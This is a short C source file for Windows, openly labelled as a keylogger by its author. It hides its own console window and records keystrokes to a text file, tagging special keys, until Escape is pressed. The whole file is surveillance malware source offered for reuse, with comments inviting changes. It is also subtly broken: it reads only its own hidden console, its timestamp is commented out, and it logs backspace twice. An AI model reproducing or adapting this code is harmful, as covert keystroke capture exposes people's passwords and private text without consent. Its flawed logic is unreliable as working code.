#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <time.h>

int main()
{
    char capture;
    FILE *file;

    // Time stuff.
    time_t t;
    t = time(NULL);
    // Hide the window
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
    
    file = fopen("keylogger.txt", "w");
    fprintf(file, "\n#$Logger: Written by jkrix. Started logging @ " /*ctime(&time)*/);
    printf("started logging %u",file);
    

    while (1)
    {
        //Sleep(20); // To make sure this program doesn't steal all resources.
        if (kbhit())
        {
            capture = getch();
            // Just add in some helper strings here to the file, feel free to modify these to your needs.
            switch ((int)capture)
            {
            case ' ': // Space key...obviously.
                fprintf(file, " ");
                break;
            case 0x09: // Tab key.
                fprintf(file, "[TAB]");
                break;
            case 0x0D: // Enter key.
                fprintf(file, "[ENTER]");
                break;
            case 0x1B: // Escape key.
                fprintf(file, "[ESC]");
                break;
            case 0x08: // Backspace key.
                fprintf(file, "[BACKSPACE]");
                //fputs("baksp",file);
                break;
            default:
                fputc(capture, file); // Put any other inputted key into the file.
                //fputs((char)capture, file);
            }
            if((int)capture == 0x08)
            {
                fprintf(file,"bsp");
            }

            if ((int)capture == 27)
            { // The escape key. You can change this to anything you want.
                fputs("\nstopped",file);
                fclose(file);
                printf("stopped loging");
                return 0;
            }
        }
    }
}